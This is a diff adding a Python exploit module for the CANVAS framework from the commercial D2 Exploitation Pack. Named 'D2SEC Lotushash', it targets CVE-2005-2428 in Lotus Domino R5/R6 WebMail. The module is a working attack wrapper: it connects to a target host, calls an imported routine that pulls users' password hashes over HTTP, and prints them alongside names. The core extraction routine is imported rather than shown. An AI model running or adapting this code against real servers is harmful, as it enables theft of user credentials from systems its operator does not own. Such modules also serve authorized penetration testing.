@@ -1,0 +1,91 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys, os, string, time, re
+import pygtk
+import gobject
+import logging
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+sys.path.append(os.path.join(os.getcwd(), '3rdparty/D2SEC/libs'))
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import canvasengine
+from canvasexploit import canvasexploit
+
+import appli.lotus
+
+# GUI info
+NAME = "D2SEC Lotushash"
+DESCRIPTION = "Access to the password hashes of Lotus users" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "IBM"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = "2005.08.03"
+DOCUMENTATION['References'] = ""
+DOCUMENTATION['Versions Affected'] = "Lotus Domino R5 and R6 WebMail"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2005-2428"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2428"
+
+DOCUMENTATION["Notes"] = "The page argument can specify the number of pages to parse."
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Remote'
+PROPERTY['ARCH'] = [["Linux"], ["Windows"]]
+
+class theexploit(canvasexploit):
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.port = 80
+    self.page = 1
+    
+  def run(self):
+    self.host = self.target.interface	
+    self.port = int(self.argsDict.get('port', self.port))
+    self.page = int(self.argsDict.get('page', self.page))
+
+    self.setInfo('[D2 LOG] %s attacking %s - running'%(NAME,self.host))
+    self.log('Wait a minute please ...')
+
+    hashes = appli.lotus.export_hash(self.host, self.port, self.page)
+    if not hashes:
+      return 0
+
+    result = ''
+    result += '%-24s %-24s %-24s %-24s' % ("FirstName", "LastName", "ShortName", "HTTPPassword")
+    print '%-24s %-24s %-24s %-24s' % ("FirstName", "LastName", "ShortName", "HTTPPassword")
+    result += '-'*120
+    print '-'*120
+    for firstname, other in hashes.items():
+      result += '%-24s %-24s %-24s %-24s' % (firstname, other[0], other[1], other[2])
+      print '%-24s %-24s %-24s %-24s' % (firstname, other[0], other[1], other[2])
+
+    self.setInfo('[D2 LOG] %s attacking %s - done' % (NAME,self.host))
+    return 1
+
+  def usage(self):
+  	print 'Usage: %s -t host -p port -O page:<num>' % (sys.argv[0])
+  	return
+
+if __name__ == '__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
